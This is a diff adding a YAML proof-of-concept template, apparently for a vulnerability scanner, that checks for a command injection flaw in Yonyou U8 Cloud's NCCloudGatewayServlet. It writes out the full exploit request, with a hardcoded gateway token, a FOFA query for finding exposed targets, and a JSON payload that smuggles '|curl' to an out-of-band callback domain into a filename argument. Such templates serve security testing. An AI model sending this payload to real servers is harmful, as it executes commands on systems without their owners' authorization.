@@ -1,0 +1,34 @@
+id: poc-yaml-yongyou-u8-cloud-nccloudgatewayservlet-command-injection
+info:
+  name: 用友U8Cloud NCCloudGatewayServlet 命令注入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 命令注入
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  random: random_str(5)
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /service/NCCloudGatewayServlet
+  headers:
+    Content-Type: application/json
+    gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+  data: "{\n  \"serviceInfo\": {\n    \"serviceClassName\": \"com.ufida.zior.console.IActionInvokeService\"\
+    ,\n    \"serviceMethodName\": \"exec\",\n    \"serviceMethodArgInfo\": [\n   \
+    \   {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\"\
+    : true,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"\
+    argValue\": { \"body\": \"nc.bs.pub.util.ProcessFileUtils\" }\n      },\n    \
+    \  {\n        \"agg\": false,\n        \"isArray\": false,\n        \"isPrimitive\"\
+    : true,\n        \"argType\": { \"body\": \"java.lang.String\" },\n        \"\
+    argValue\": { \"body\": \"openFile\" }\n      },\n      {\n        \"agg\": false,\n\
+    \        \"isArray\": false,\n        \"isPrimitive\": false,\n        \"argType\"\
+    : { \"body\": \"java.lang.String\" },\n        \"argValue\": {\n          \"body\"\
+    : \"{{.random}}.txt \\\"|curl https://{{.domain}}\\\"\"\n        }\n      }\n\
+    \    ]\n  }\n}"
+  expression: status_code == 200 && contains(body,`{"agg":false}`) && contains(content_type,"application/json")
+    && reverse.Verify()
+transport: http
